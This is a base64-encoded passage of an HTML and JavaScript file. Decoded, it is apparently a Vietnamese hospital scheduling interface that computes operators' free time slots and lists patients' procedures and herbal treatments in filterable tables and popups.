oPg0KICAgICAgICANCiAgICAgICAgPHRoPkdp4budIHRy4buRbmcgYnXhu5VpIHPDoW5nPC90aD4NCiAgICAgICAgPHRoPkdp4budIHRy4buRbmcgYnXhu5VpIGNoaeG7gXU8L3RoPg0KICAgICAgPC90cj4NCiAgICA8L3RoZWFkPg0KICAgIDx0Ym9keSBpZD0iYXZhaWxhYmlsaXR5Qm9keSI+PC90Ym9keT4NCiAgPC90YWJsZT4NCjwvZGl2Pg0KPCEtLSBL4bq+VCBUSMOaQzogQuG6ok5HIEdJ4bucIFRS4buQTkcgVOG7qk5HIE5Hxq/hu5xJIC0tPg0KPC9kaXY+DQo8L2Rpdj4NCjwvZGl2Pg0KPC9kaXY+DQoNCjxzY3JpcHQ+DQpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJET01Db250ZW50TG9hZGVkIiwgZnVuY3Rpb24oKSB7DQogIGNvbnN0IG5vaWR1bmcgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgibm9pZHVuZyIpOw0KICBjb25zdCBsaXN0MSA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIi5saXN0MSIpOw0KDQogIGlmIChub2lkdW5nICYmIGxpc3QxKSB7DQogICAgY29uc3QgdGV4dCA9IG5vaWR1bmcudGV4dENvbnRlbnQgfHwgbm9pZHVuZy5pbm5lclRleHQgfHwgIiI7DQogICAgaWYgKHRleHQudHJpbSgpID09PSAiIikgew0KICAgICAgbGlzdDEuc3R5bGUuZGlzcGxheSA9ICJub25lIjsNCiAgICB9DQogIH0NCn0pOw0KDQovLyA9PT09IFTDjU5IIFRPw4FOIEdJ4bucIFRS4buQTkcgQ0hPIFThu6pORyBOR8av4bucSSA9PT09DQoNCg0KDQpmdW5jdGlvbiB0b2dnbGVBdmFpbGFiaWxpdHkoKSB7DQogICAgY29uc3QgdGFibGUgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYXZhaWxhYmlsaXR5VGFibGUnKTsNCiAgICBjb25zdCBmaWx0ZXJCbG9jayA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdhdmFpbGFiaWxpdHlGaWx0ZXJCbG9jaycpOw0KICAgIGlmICh0YWJsZS5zdHlsZS5kaXNwbGF5ID09PSAnbm9uZScpIHsNCiAgICAgICAgdGFibGUuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogICAgICAgIGlmIChmaWx0ZXJCbG9jaykgZmlsdGVyQmxvY2suc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogICAgICAgIGNhbGN1bGF0ZUF2YWlsYWJpbGl0eSgpOw0KICAgIH0gZWxzZSB7DQogICAgICAgIHRhYmxlLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgICAgIGlmIChmaWx0ZXJCbG9jaykgZmlsdGVyQmxvY2suc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICB9DQp9DQoNCg0KZnVuY3Rpb24gY2FsY3VsYXRlQXZhaWxhYmlsaXR5KCkgew0KICAgIGNvbnN0IGdyb3VwcyA9IHt9Ow0KICAgIGFsbFByb2NlZHVyZXMuZm9yRWFjaChwcm9jID0+IHsNCiAgICAgICAgY29uc3Qga2V5ID0gYCR7cHJvYy5vcGVyYXRvcn1fJHtwcm9jLmRhdGV9YDsNCiAgICAgICAgaWYgKCFncm91cHNba2V5XSkgZ3JvdXBzW2tleV0gPSBbXTsNCiAgICAgICAgZ3JvdXBzW2tleV0ucHVzaChwcm9jKTsNCiAgICB9KTsNCg0KICAgIGNvbnN0IHRib2R5ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2F2YWlsYWJpbGl0eUJvZHknKTsNCiAgICB0Ym9keS5pbm5lckhUTUwgPSAnJzsNCg0KICAgIGNvbnN0IHNlbGVjdGVkT3AgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZmlsdGVyT3BlcmF0b3InKT8udmFsdWUgfHwgJ2FsbCc7DQogICAgY29uc3Qgc2VsZWN0ZWREYXRlID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZpbHRlckRhdGUnKT8udmFsdWUgfHwgJ2FsbCc7DQoNCiAgICAvLyBDaOG7iSBraOG7n2kgdOG6oW8gZHJvcGRvd24gMSBs4bqnbg0KICAgIGlmICghZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZpbHRlck9wZXJhdG9yJykuZGF0YXNldC5pbml0aWFsaXplZCkgew0KICAgICAgICBjb25zdCBvcGVyYXRvcnMgPSBbLi4ubmV3IFNldChhbGxQcm9jZWR1cmVzLm1hcChwID0+IHAub3BlcmF0b3IpKV0uc29ydCgpOw0KICAgICAgICBjb25zdCBkYXRlcyA9IFsuLi5uZXcgU2V0KGFsbFByb2NlZHVyZXMubWFwKHAgPT4gcC5kYXRlKSldLnNvcnQoKGEsIGIpID0+IHsNCiAgICAgICAgICAgIGNvbnN0IFtkYSwgbWEsIHlhXSA9IGEuc3BsaXQoJy8nKS5tYXAoTnVtYmVyKTsNCiAgICAgICAgICAgIGNvbnN0IFtkYiwgbWIsIHliXSA9IGIuc3BsaXQoJy8nKS5tYXAoTnVtYmVyKTsNCiAgICAgICAgICAgIHJldHVybiBuZXcgRGF0ZSh5YSwgbWEgLSAxLCBkYSkgLSBuZXcgRGF0ZSh5YiwgbWIgLSAxLCBkYik7DQogICAgICAgIH0pOw0KDQogICAgICAgIGNvbnN0IG9wU2VsZWN0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZpbHRlck9wZXJhdG9yJyk7DQogICAgICAgIGNvbnN0IGRhdGVTZWxlY3QgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZmlsdGVyRGF0ZScpOw0KDQogICAgICAgIG9wU2VsZWN0LmlubmVySFRNTCA9ICc8b3B0aW9uIHZhbHVlPSJhbGwiPlThuqV0IGPhuqM8L29wdGlvbj4nICsNCiAgICAgICAgICAgIG9wZXJhdG9ycy5tYXAob3AgPT4gYDxvcHRpb24gdmFsdWU9IiR7b3B9Ij4ke29wLnJlcGxhY2UoLywvZywgJycpfTwvb3B0aW9uPmApLmpvaW4oJycpOw0KICAgICAgICBkYXRlU2VsZWN0LmlubmVySFRNTCA9ICc8b3B0aW9uIHZhbHVlPSJhbGwiPlThuqV0IGPhuqM8L29wdGlvbj4nICsNCiAgICAgICAgICAgIGRhdGVzLm1hcChkID0+IGA8b3B0aW9uIHZhbHVlPSIke2R9Ij4ke2R9PC9vcHRpb24+YCkuam9pbignJyk7DQoNCiAgICAgICAgb3BTZWxlY3QuZGF0YXNldC5pbml0aWFsaXplZCA9ICd0cnVlJzsNCiAgICAgICAgZGF0ZVNlbGVjdC5kYXRhc2V0LmluaXRpYWxpemVkID0gJ3RydWUnOw0KDQogICAgICAgIG9wU2VsZWN0LmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGNhbGN1bGF0ZUF2YWlsYWJpbGl0eSk7DQogICAgICAgIGRhdGVTZWxlY3QuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgY2FsY3VsYXRlQXZhaWxhYmlsaXR5KTsNCiAgICB9DQoNCiAgICBPYmplY3Qua2V5cyhncm91cHMpLmZvckVhY2goa2V5ID0+IHsNCiAgICAgICAgY29uc3QgW29wZXJhdG9yLCBkYXRlXSA9IGtleS5zcGxpdCgnXycpOw0KICAgICAgICBpZiAoKHNlbGVjdGVkT3AgIT09ICdhbGwnICYmIG9wZXJhdG9yICE9PSBzZWxlY3RlZE9wKSB8fA0KICAgICAgICAgICAgKHNlbGVjdGVkRGF0ZSAhPT0gJ2FsbCcgJiYgZGF0ZSAhPT0gc2VsZWN0ZWREYXRlKSkgcmV0dXJuOw0KDQogICAgICAgIGNvbnN0IHByb2NlZHVyZXMgPSBncm91cHNba2V5XTsNCiAgICAgICAgcHJvY2VkdXJlcy5zb3J0KChhLCBiKSA9PiBhLnN0YXJ0IC0gYi5zdGFydCk7DQoNCiAgICAgICAgY29uc3QgbW9ybmluZ1N0YXJ0ID0gNyAqIDM2MDA7DQogICAgICAgIGNvbnN0IG1vcm5pbmdFbmQgPSAxMS41ICogMzYwMDsNCiAgICAgICAgY29uc3QgYWZ0ZXJub29uU3RhcnQgPSAxMy41ICogMzYwMDsNCiAgICAgICAgY29uc3QgYWZ0ZXJub29uRW5kID0gMTcgKiAzNjAwOw0KDQogICAgICAgIGNvbnN0IG1vcm5pbmdGcmVlID0gZ2V0RnJlZVNsb3RzKHByb2NlZHVyZXMsIG1vcm5pbmdTdGFydCwgbW9ybmluZ0VuZCk7DQogICAgICAgIGNvbnN0IGFmdGVybm9vbkZyZWUgPSBnZXRGcmVlU2xvdHMocHJvY2VkdXJlcywgYWZ0ZXJub29uU3RhcnQsIGFmdGVybm9vbkVuZCk7DQoNCiAgICAgICAgY29uc3Qgcm93ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgndHInKTsNCiAgICAgICAgcm93LmNsYXNzTGlzdC5hZGQoImhlcmItcm93Iik7DQogICAgICAgIHJvdy5pbm5lckhUTUwgPSBgDQogICAgICAgICAgICA8dGQ+PGEgaHJlZj0iIyIgb25jbGljaz0ic2hvd1Byb2NlZHVyZXNGb3JPcGVyYXRvcihcYCR7b3BlcmF0b3J9XGAsIFxgJHtkYXRlfVxgKTtyZXR1cm4gZmFsc2U7IiBzdHlsZT0iY29sb3I6IzM0OThkYjtmb250LXdlaWdodDpib2xkIj4ke29wZXJhdG9yLnJlcGxhY2UoLywvZywgJycpfTwvYT48L3RkPg0KICAgICAgICAgICAgPHRkPiR7ZGF0ZX08L3RkPg0KICAgICAgICAgICAgPHRkPiR7bW9ybmluZ0ZyZWV9PC90ZD4NCiAgICAgICAgICAgIDx0ZD4ke2FmdGVybm9vbkZyZWV9PC90ZD4NCiAgICAgICAgYDsNCiAgICAgICAgdGJvZHkuYXBwZW5kQ2hpbGQocm93KTsNCiAgICB9KTsNCn0NCg0KDQpmdW5jdGlvbiBnZXRGcmVlU2xvdHMocHJvY2VkdXJlcywgc3RhcnQsIGVuZCkgew0KICAgIGNvbnN0IGJ1c3kgPSBwcm9jZWR1cmVzLm1hcChwID0+ICh7DQogICAgICAgIHN0YXJ0OiBwLnN0YXJ0LA0KICAgICAgICBlbmQ6IHAuZW5kICsgKChwLnByb2NlZHVyZUluZm8/LmJ1ZmZlciB8fCAwKSAqIDYwKQ0KICAgIH0pKS5maWx0ZXIocCA9PiBwLmVuZCA+IHN0YXJ0ICYmIHAuc3RhcnQgPCBlbmQpOw0KDQogICAgYnVzeS5zb3J0KChhLCBiKSA9PiBhLnN0YXJ0IC0gYi5zdGFydCk7DQoNCiAgICBjb25zdCBmcmVlID0gW107DQogICAgbGV0IGN1cnNvciA9IHN0YXJ0Ow0KDQogICAgZm9yIChjb25zdCBiIG9mIGJ1c3kpIHsNCiAgICAgICAgaWYgKGIuc3RhcnQgPiBjdXJzb3IgJiYgYi5zdGFydCA+IHN0YXJ0ICYmIGN1cnNvciA8IGVuZCkgew0KICAgICAgICAgICAgY29uc3QgZnJlZVN0YXJ0ID0gTWF0aC5tYXgoY3Vyc29yLCBzdGFydCk7DQogICAgICAgICAgICBjb25zdCBmcmVlRW5kID0gTWF0aC5taW4oYi5zdGFydCwgZW5kKTsNCiAgICAgICAgICAgIGlmIChmcmVlRW5kID4gZnJlZVN0YXJ0KSB7DQogICAgICAgICAgICAgICAgZnJlZS5wdXNoKGAke2Zvcm1hdFRpbWUoZnJlZVN0YXJ0KX0gLSAke2Zvcm1hdFRpbWUoZnJlZUVuZCl9YCk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgY3Vyc29yID0gTWF0aC5tYXgoY3Vyc29yLCBiLmVuZCk7DQogICAgfQ0KDQogICAgaWYgKGN1cnNvciA8IGVuZCkgew0KICAgICAgICBmcmVlLnB1c2goYCR7Zm9ybWF0VGltZShjdXJzb3IpfSAtICR7Zm9ybWF0VGltZShlbmQpfWApOw0KICAgIH0NCg0KICAgIHJldHVybiBmcmVlLmxlbmd0aCA/IGZyZWUuam9pbignPGJyPicpIDogJzxpPktow7RuZyBjw7JuIHRy4buRbmc8L2k+JzsNCn0NCg0KZnVuY3Rpb24gZm9ybWF0VGltZShzZWMpIHsNCiAgICBjb25zdCBoID0gTWF0aC5mbG9vcihzZWMgLyAzNjAwKTsNCiAgICBjb25zdCBtID0gTWF0aC5mbG9vcigoc2VjICUgMzYwMCkgLyA2MCk7DQogICAgcmV0dXJuIGgudG9TdHJpbmcoKS5wYWRTdGFydCgyLCAnMCcpICsgJ2gnICsgbS50b1N0cmluZygpLnBhZFN0YXJ0KDIsICcwJyk7DQp9DQoNCmZ1bmN0aW9uIHNob3dQcm9jZWR1cmVzRm9yT3BlcmF0b3Iob3BlcmF0b3IsIGRhdGUpIHsNCiAgICBjb25zdCBvdmVybGF5ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Byb2NlZHVyZU92ZXJsYXknKTsNCiAgICBjb25zdCBjb250ZW50ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3BvcHVwQ29udGVudCcpOw0KICAgIGNvbnN0IGxpc3QgPSBhbGxQcm9jZWR1cmVzLmZpbHRlcihwID0+IHAub3BlcmF0b3IgPT09IG9wZXJhdG9yICYmIHAuZGF0ZSA9PT0gZGF0ZSk7DQoNCiAgICBpZiAobGlzdC5sZW5ndGggPT09IDApIHsNCiAgICAgICAgY29udGVudC5pbm5lckhUTUwgPSAiPGk+S2jDtG5nIHTDrG0gdGjhuqV5IHRo4bunIHRodeG6rXQ8L2k+IjsNCiAgICB9IGVsc2Ugew0KICAgICAgICBsaXN0LnNvcnQoKGEsIGIpID0+IGEuc3RhcnQgLSBiLnN0YXJ0KTsNCiAgICAgICAgY29udGVudC5pbm5lckhUTUwgPSAiPGI+TmfGsOG7nWkgdGjhu7FjIGhp4buHbjo8L2I+ICIgKyBvcGVyYXRvciArICI8YnI+PGI+TmfDoHk6PC9iPiAiICsgZGF0ZSArICI8YnI+PGJyPiIgKw0KICAgICAgICAgICAgIjx1bCBzdHlsZT0ncGFkZGluZy1sZWZ0OjIwcHgnPiIgKyBsaXN0Lm1hcChwID0+IA0KICAgICAgICAgICAgICAgICI8bGk+PGI+IiArIHAucGF0aWVudE5hbWUgKyAiPC9iPiAtICIgKyBwLnByb2NlZHVyZSArICIgKCIgKyBwLmRpc3BsYXlTdGFydCArICIg4oaSICIgKyBwLmRpc3BsYXlFbmQgKyAiKTwvbGk+Ig0KICAgICAgICAgICAgKS5qb2luKCcnKSArICI8L3VsPiI7DQogICAgfQ0KDQogICAgb3ZlcmxheS5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCn0NCg0KZnVuY3Rpb24gY2xvc2VQcm9jZWR1cmVQb3B1cCgpIHsNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncHJvY2VkdXJlT3ZlcmxheScpLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQp9DQo8L3NjcmlwdD4NCjwhLS0gUG9wdXAgdGjhu6cgdGh14bqtdCBjaGkgdGnhur90IHbhu5tpIG92ZXJsYXkgLS0+DQo8ZGl2IGlkPSJwcm9jZWR1cmVPdmVybGF5IiBzdHlsZT0iZGlzcGxheTpub25lO3Bvc2l0aW9uOmZpeGVkO3RvcDowO2xlZnQ6MDt3aWR0aDoxMDAlO2hlaWdodDoxMDAlO2JhY2tncm91bmQ6cmdiYSgwLDAsMCwwLjQpO3otaW5kZXg6MTAwMDAiIG9uY2xpY2s9ImNsb3NlUHJvY2VkdXJlUG9wdXAoKSI+DQogIDxkaXYgaWQ9InByb2NlZHVyZVBvcHVwIiBvbmNsaWNrPSJldmVudC5zdG9wUHJvcGFnYXRpb24oKSIgc3R5bGU9InBvc2l0aW9uOnJlbGF0aXZlO3RvcDoxMCU7bGVmdDo1MCU7dHJhbnNmb3JtOnRyYW5zbGF0ZVgoLTUwJSk7YmFja2dyb3VuZDojZmZmO2NvbG9yOiMwMDA7Ym9yZGVyOjJweCBzb2xpZCAjMzQ5OGRiO3BhZGRpbmc6MjBweDtib3JkZXItcmFkaXVzOjhweDtib3gtc2hhZG93OjAgNXB4IDIwcHggcmdiYSgwLDAsMCwwLjMpO21heC1oZWlnaHQ6NzB2aDtvdmVyZmxvdzphdXRvO2ZvbnQtZmFtaWx5OkludGVyLHNhbnMtc2VyaWY7bWF4LXdpZHRoOjYwMHB4Ij4NCiAgICA8aDM+Q2hpIHRp4bq/dCB0aOG7pyB0aHXhuq10PC9oMz4NCiAgICA8ZGl2IGlkPSJwb3B1cENvbnRlbnQiPjwvZGl2Pg0KICAgIDxici8+DQogICAgPGJ1dHRvbiBjbGFzcz0iYnRuIiBvbmNsaWNrPSJjbG9zZVByb2NlZHVyZVBvcHVwKCkiPsSQw7NuZzwvYnV0dG9uPg0KICA8L2Rpdj4NCjwvZGl2Pg0KDQoNCg0KDQoNCjxzY3JpcHQ+DQpmdW5jdGlvbiByZW5kZXJIZXJiTGlzdCgpIHsNCiAgICBjb25zdCB0Ym9keSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiVGFibGVCb2R5Jyk7DQogICAgdGJvZHkuaW5uZXJIVE1MID0gJyc7DQoNCiAgICBjb25zdCBoZXJicyA9IHdpbmRvdy5hbGxIZXJiUHJvY2VkdXJlcyB8fCBbXTsNCiAgICBjb25zdCBkYXRlRmlsdGVyID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2hlcmJEYXRlRmlsdGVyJyk7DQogICAgY29uc3QgZG9jdG9yRmlsdGVyID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2hlcmJEb2N0b3JGaWx0ZXInKTsNCg0KICAgIGlmICghZGF0ZUZpbHRlci5kYXRhc2V0LmluaXRpYWxpemVkKSB7DQogICAgICAgIGNvbnN0IHVuaXF1ZURhdGVzID0gWy4uLm5ldyBTZXQoaGVyYnMubWFwKGggPT4gaC5kYXRlKSldLnNvcnQoKGEsIGIpID0+IHsNCiAgICAgICAgICAgIGNvbnN0IFtkYSwgbWEsIHlhXSA9IGEuc3BsaXQoJy8nKS5tYXAoTnVtYmVyKTsNCiAgICAgICAgICAgIGNvbnN0IFtkYiwgbWIsIHliXSA9IGIuc3BsaXQoJy8nKS5tYXAoTnVtYmVyKTsNCiAgICAgICAgICAgIHJldHVybiBuZXcgRGF0ZSh5YSwgbWEgLSAxLCBkYSkgLSBuZXcgRGF0ZSh5YiwgbWIgLSAxLCBkYik7DQogICAgICAgIH0pOw0KDQogICAgICAgIGNvbnN0IHVuaXF1ZURvY3RvcnMgPSBbLi4ubmV3IFNldChoZXJicy5tYXAoaCA9PiBoLmRvY3RvciB8fCAnS2jDtG5nIGPDsycpKV0uc29ydCgpOw0KDQogICAgICAgIGRhdGVGaWx0ZXIuaW5uZXJIVE1MID0gJzxvcHRpb24gdmFsdWU9ImFsbCI+VOG6pXQgY+G6ozwvb3B0aW9uPicgKw0KICAgICAgICAgICAgdW5pcXVlRGF0ZXMubWFwKGQgPT4gYDxvcHRpb24gdmFsdWU9IiR7ZH0iPiR7ZH08L29wdGlvbj5gKS5qb2luKCcnKTsNCg0KICAgICAgICBkb2N0b3JGaWx0ZXIuaW5uZXJIVE1MID0gJzxvcHRpb24gdmFsdWU9ImFsbCI+VOG6pXQgY+G6oyBiw6FjIHPEqTwvb3B0aW9uPicgKw0KICAgICAgICAgICAgdW5pcXVlRG9jdG9ycy5tYXAoZCA9PiBgPG9wdGlvbiB2YWx1ZT0iJHtkfSI+JHtkfTwvb3B0aW9uPmApLmpvaW4oJycpOw0KDQogICAgICAgIGRhdGVGaWx0ZXIuZGF0YXNldC5pbml0aWFsaXplZCA9ICJ0cnVlIjsNCiAgICAgICAgZGF0ZUZpbHRlci5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCByZW5kZXJIZXJiTGlzdCk7DQogICAgICAgIGRvY3RvckZpbHRlci5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCByZW5kZXJIZXJiTGlzdCk7DQogICAgfQ0KDQogICAgY29uc3Qgc2VsZWN0ZWREYXRlID0gZGF0ZUZpbHRlci52YWx1ZTsNCiAgICBjb25zdCBzZWxlY3RlZERvY3RvciA9IGRvY3RvckZpbHRlci52YWx1ZTsNCg0KICAgIGNvbnN0IGZpbHRlcmVkSGVyYnMgPSBoZXJicy5maWx0ZXIocCA9Pg0KICAgICAgICAoc2VsZWN0ZWREYXRlID09PSAnYWxsJyB8fCBwLmRhdGUgPT09IHNlbGVjdGVkRGF0ZSkgJiYNCiAgICAgICAgKHNlbGVjdGVkRG9jdG9yID09PSAnYWxsJyB8fCBwLmRvY3RvciA9PT0gc2VsZWN0ZWREb2N0b3IpDQogICAgKTsNCg0KICAgIGlmIChmaWx0ZXJlZEhlcmJzLmxlbmd0aCA9PT0gMCkgew0KICAgICAgICBjb25zdCByb3cgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCd0cicpOw0KICAgICAgICByb3cuY2xhc3NMaXN0LmFkZCgiaGVyYi1yb3ciKTsNCiAgICAgICAgcm93LmlubmVySFRNTCA9IGA8dGQgY29sc3Bhbj0iNSI+PGNlbnRlcj5LaMO0bmcgY8OzIGThu68gbGnhu4d1IHPhuq9jIHRodeG7kWMgdGhhbmc8L2NlbnRlcj48L3RkPmA7DQogICAgICAgIHRib2R5LmFwcGVuZENoaWxkKHJvdyk7DQogICAgICAgIHJldHVybjsNCiAgICB9DQoNCiAgICBmaWx0ZXJlZEhlcmJzLmZvckVhY2gocCA9PiB7DQogICAgICAgIGNvbnN0IHJvdyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3RyJyk7DQogICAgICAgIHJvdy5jbGFzc0xpc3QuYWRkKCJoZXJiLXJvdyIpOw0KICAgICAgICByb3cuaW5uZXJIVE1MID0gYA0KICAgICAgICAgICAgPHRkPiR7cC5wYXRpZW50TmFtZX0gWzxmb250IGNvbG9yPSJyZWQiPiR7cC5wYXRpZW50QWdlfTwvZm9udD5dPGJyLz4ke3AucGF0aWVudElkfTwvdGQ+DQogICAgICAgICAgICA8dGQ+JHtwLnByb2NlZHVyZX08L3RkPg0KICAgICAgICAgICAgPHRkPiR7cC5kYXRlfTwvdGQ+DQogICAgICAgICAgICA8dGQ+JHtwLmRpc3BsYXlTdGFydH0gLT4gJHtwLmRpc3BsYXlFbmR9PC90ZD4NCiAgICAgICAgICAgIDx0ZD4ke3Aub3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJyl9PC90ZD4NCiAgICAgICAgYDsNCiAgICAgICAgdGJvZHkuYXBwZW5kQ2hpbGQocm93KTsNCiAgICB9KTsNCn0NCg0KDQpmdW5jdGlvbiB0b2dnbGVIZXJiTGlzdCgpIHsNCiAgICBjb25zdCB0YWJsZSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiUHJvY2VkdXJlVGFibGUnKTsNCiAgICBpZiAodGFibGUuc3R5bGUuZGlzcGxheSA9PT0gJ25vbmUnKSB7DQogICAgICAgIHRhYmxlLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgICAgICByZW5kZXJIZXJiTGlzdCgpOw0KICAgIH0gZWxzZSB7DQogICAgICAgIHRhYmxlLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgfQ0KfQ0KPC9zY3JpcHQ+DQoNCg0KDQo8c2NyaXB0Pg0KKGZ1bmN0aW9uKCl7DQogIC8qID09PT0gVEnhu4ZOIMONQ0ggQ0hV4bqoTiBIT8OBIFTDik4gPT09PSAqLw0KICBmdW5jdGlvbiBjbGVhbkRpc3BsYXkobmFtZSl7DQogICAgcmV0dXJuIChuYW1lfHwnJykNCiAgICAgIC50b1N0cmluZygpDQogICAgICAucmVwbGFjZSgvWyzvvIxdK1xzKiQvLCcnKQ0KICAgICAgLnJlcGxhY2UoL1xzKy9nLCcgJykNCiAgICAgIC50cmltKCk7DQogIH0NCiAgZnVuY3Rpb24gbm9ybShuYW1lKXsNCiAgICByZXR1cm4gY2xlYW5EaXNwbGF5KG5hbWUpLnRvTG93ZXJDYXNlKCk7DQogIH0NCg0KICAvKiA9PT09IFTDjU5IIMSQQSBT4buQIFRIRU8gTkfDgFkgPT09PSAqLw0KICBmdW5jdGlvbiBjb21wdXRlTWFqb3JpdHlCeURhdGUocm93cyl7DQogICAgY29uc3QgbWFwID0gT2JqZWN0LmNyZWF0ZShudWxsKTsNCiAgICByb3dzLmZvckVhY2gocj0+ew0KICAgICAgY29uc3QgZCA9IHIuZGF0ZTsNCiAgICAgIGNvbnN0IG4gPSBub3JtKHIub3BlcmF0b3IpOw0KICAgICAgaWYoIW4gfHwgbiA9PT0gJ2tow7RuZyBjw7MnKSByZXR1cm47DQogICAgICAobWFwW2RdfHwobWFwW2RdPXt9KSlbbl0gPSAobWFwW2RdW25dfHwwKSsxOw0KICAgIH0pOw0KICAgIGNvbnN0IG91dCA9IHt9Ow0KICAgIE9iamVjdC5rZXlzKG1hcCkuZm9yRWFjaChkPT57DQogICAgICBjb25zdCBhcnIgPSBPYmplY3QuZW50cmllcyhtYXBbZF0pLnNvcnQoKGEsYik9PmJbMV0tYVsxXSk7DQogICAgICBjb25zdCB0b3AgPSBhcnJbMF0gfHwgW251bGwsMF07DQogICAgICBjb25zdCBzZWNvbmQgPSBhcnJbMV0gfHwgW251bGwsMF07DQogICAgICBvdXRbZF0gPSB7IHRvcE5vcm06dG9wWzBdLCB0b3BDb3VudDp0b3BbMV0sIHNlY29uZENvdW50OnNlY29uZFsxXSB9Ow0KICAgIH0pOw0KICAgIHJldHVybiBvdXQ7DQogIH0NCg0KICAvKiA9PT09IFVJIFBI4bukOiBUw5NNIFThuq5UICsgUE9QVVAgPT09PSAqLw0KICBmdW5jdGlvbiBlbnN1cmVPdXRsaWVyVUkoKXsNCiAgICBjb25zdCBzdW1tYXJ5ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2hlcmJPdXRsaWVyU3VtbWFyeScpOw0KICAgIGNvbnN0IG1vZGFsICAgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYk91dGxpZXJNb2RhbCcpOw0KICAgIGlmKCFzdW1tYXJ5KSBjb25zb2xlLndhcm4oJ1RoaeG6v3UgI2hlcmJPdXRsaWVyU3VtbWFyeSB0cm9uZyBIVE1MIScpOw0KICAgIGlmKCFtb2RhbCkgICBjb25zb2xlLndhcm4oJ1RoaeG6v3UgI2hlcmJPdXRsaWVyTW9kYWwgdHJvbmcgSFRNTCEnKTsNCiAgICBjb25zdCBidG4gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYk91dGxpZXJDbG9zZUJ0bicpOw0KICAgIGNvbnN0IGJhY2tkcm9wID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2hlcmJPdXRsaWVyQmFja2Ryb3AnKTsNCiAgICBpZihidG4pIGJ0bi5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsICgpPT5tb2RhbC5zdHlsZS5kaXNwbGF5PSdub25lJyk7DQogICAgaWYoYmFja2Ryb3ApIGJhY2tkcm9wLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgKCk9Pm1vZGFsLnN0eWxlLmRpc3BsYXk9J25vbmUnKTsNCiAgfQ0KICBlbnN1cmVPdXRsaWVyVUkoKTsNCg0KICAvKiA9PT09IEdISSDEkMOIIEjDgE0gUkVOREVSID09PT0gKi8NCi8qID09PT0gR0hJIMSQw4ggSMOATSBSRU5ERVIgPT09PSAqLw0KDQovLyBoZWxwZXI6IHRy4bqjIHbhu4EgZGFuaCBzw6FjaCBuZ8OgeSBjw7MgY2Egc+G6r2MgdGh14buRYyBs4buXaQ0KZnVuY3Rpb24gZ2V0SGVyYkVycm9yRGF0ZXMoYWxsSGVyYnMpew0KICBjb25zdCBtYWpvcml0eSA9IGNvbXB1dGVNYWpvcml0eUJ5RGF0ZShhbGxIZXJicyk7DQogIGNvbnN0IGRhdGVzID0gbmV3IFNldCgpOw0KDQogIGFsbEhlcmJzLmZvckVhY2goaD0+ew0KICAgIGNvbnN0IG0gPSBtYWpvcml0eVtoLmRhdGVdOw0KICAgIGNvbnN0IGhhc01ham9yaXR5ID0gbSAmJiBtLnRvcE5vcm0gJiYgbS50b3BDb3VudCA+IG0uc2Vjb25kQ291bnQ7DQogICAgaWYoaGFzTWFqb3JpdHkgJiYgaC5vcE5vcm0gIT09IG0udG9wTm9ybSl7DQogICAgICBkYXRlcy5hZGQoaC5kYXRlKTsNCiAgICB9DQogIH0pOw0KDQogIHJldHVybiBBcnJheS5mcm9tKGRhdGVzKTsNCn0NCg0Kd2luZG93LnJlbmRlckhlcmJMaXN0ID0gZnVuY3Rpb24oKXsNCiAgY29uc3QgdGJvZHkgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYlRhYmxlQm9keScpOw0KICBjb25zdCBkYXRlRmlsdGVyID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2hlcmJEYXRlRmlsdGVyJyk7DQogIGNvbnN0IGRvY3RvckZpbHRlciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiRG9jdG9yRmlsdGVyJyk7DQogIGNvbnN0IHN1bW1hcnlEaXYgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYk91dGxpZXJTdW1tYXJ5Jyk7DQogIGNvbnN0IG1vZGFsID0gZG9jdW1lbnQu